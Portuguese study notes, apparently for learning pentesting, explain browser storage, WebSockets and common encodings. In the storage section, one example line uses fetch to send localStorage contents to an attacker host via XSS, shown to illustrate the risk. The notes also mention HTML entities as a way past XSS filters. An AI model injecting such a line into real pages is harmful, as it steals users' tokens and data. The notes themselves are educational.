# Client-Side Data Stores

## O que são?

São formas do navegador armazenar dados localmente, sem depender de cookies. HTML5 introduziu três tipos principais.

## Diferença com Cookies

| Característica | Cookie | Client-Side Data Store |
|----------------|--------|----------------------|
| Tamanho | 4 KB | 5 MB a 10 MB |
| Enviado nas requisições | Sempre (automático) | Nunca (só via JS) |
| Acesso | Servidor + JS | Só JS |
| Estrutura | Campo complexo | Chave-valor simples |

---

## LocalStorage

- Dados **persistentes** - ficam mesmo fechando o navegador
- Compartilhado entre todas as abas da mesma origem
- Só é deletado manualmente pelo app ou pelo usuário

```javascript
localStorage.setItem('usuario', 'joao');        // guarda
localStorage.getItem('usuario');                // recupera → 'joao'
localStorage.removeItem('usuario');             // remove
localStorage.clear();                           // limpa tudo
```

---

## SessionStorage

- Dados temporários - some quando a aba/janela fecha
- **Cada aba tem o seu próprio** sessionStorage, mesmo para o mesmo site
- Persiste se o usuário apenas atualizar a página

Mesma API do localStorage:
```javascript
sessionStorage.setItem('token_temp', 'abc123');
sessionStorage.getItem('token_temp');
```

---

## IndexedDB

Para dados mais complexos: objetos, arquivos, blobs. É um banco de dados completo no navegador.

---

## Risco de segurança

> ⚠️ **LocalStorage e SessionStorage são acessíveis via JavaScript, ou seja, vulneráveis a XSS.**

Se um invasor conseguir injetar JS na página, ele pode roubar tudo que estiver armazenado:

```javascript
// Script malicioso que exfiltra o storage
fetch('https://attacker.com/steal?data=' + JSON.stringify(localStorage));
```

Por isso, **nunca armazene tokens de autenticação no localStorage** de forma descuidada. Prefira cookies com `HttpOnly`.

---
---

# WebSockets

## O que são?

Protocolo de comunicação **bidirecional** e em tempo real entre cliente e servidor. Diferente do HTTP, onde o cliente sempre inicia, no WebSocket os dois lados podem enviar mensagens a qualquer momento.

Surgiu para resolver a limitação do HTTP em aplicações que precisam de baixa latência: chats, jogos online, atualizações ao vivo.

## Como funciona?

A conexão começa como HTTP e é "atualizada" para WebSocket:

```
GET /chat HTTP/1.1
Upgrade: websocket
Connection: Upgrade
```

Depois disso, a conexão fica aberta e os dois lados trocam mensagens livremente.

- `ws://` → WebSocket sem criptografia (porta 80)
- `wss://` → WebSocket com criptografia (porta 443)

## Código básico

```javascript
const ws = new WebSocket('ws://servidor.com/chat');

ws.onopen = function() {
    ws.send('Olá servidor!');
};

ws.onmessage = function(evento) {
    console.log('Mensagem recebida:', evento.data);
};
```

## Segurança

O protocolo em si não é inseguro, mas se o servidor não tratar (sanitizar) as mensagens recebidas, qualquer ataque baseado em entrada não validada (XSS, SQLi, command injection) pode se aplicar via WebSocket.

---
---

# Encodings

## Por que importa no pentest?

Entender como os dados são codificados é fundamental. Muitas vezes o dado está "escondido" em um encoding diferente, e saber decodificá-lo revela informações sensíveis ou permite construir payloads eficazes.

---

## ASCII

O encoding mais básico. Mapeia caracteres (letras, números, símbolos) para valores numéricos de 0 a 127.

---

## Unicode / UTF-8

Padrão para representar praticamente todos os caracteres de todos os idiomas. UTF-8 é a implementação mais usada na web.

---

## Base64

Codifica dados binários em texto usando 64 caracteres: `A-Z`, `a-z`, `0-9`, `+`, `/` e `=` para padding.

Muito usado para:
- Transmitir dados binários em HTTP
- Autenticação Basic Auth
- Parte dos tokens JWT

```bash
# Codificar
echo -n "usuario:senha" | base64
# Resultado: dXN1YXJpbzpzZW5oYQ==

# Decodificar
echo "dXN1YXJpbzpzZW5oYQ==" | base64 -d
# Resultado: usuario:senha
```

> ⚠️ **Base64 não é criptografia.** Qualquer pessoa pode decodificar. Se você ver um valor em Base64 numa requisição, decodifique sempre.

---

## URL Encoding

Já visto na seção de URL. Substitui caracteres especiais por `%HH` onde HH é o valor hexadecimal.

```
Espaço → %20
&      → %26
=      → %3D
```

---

## Hexadecimal

Representa bytes em base 16 (0-9, A-F). Muito usado para representar bytes individuais.

```
A → 0x41
/ → 0x2F
```

---

## HTML Entities

Usadas dentro de HTML para representar caracteres especiais:

```
< → &lt;
> → &gt;
& → &amp;
" → &quot;
```

Importante para entender e bypassar filtros de XSS.
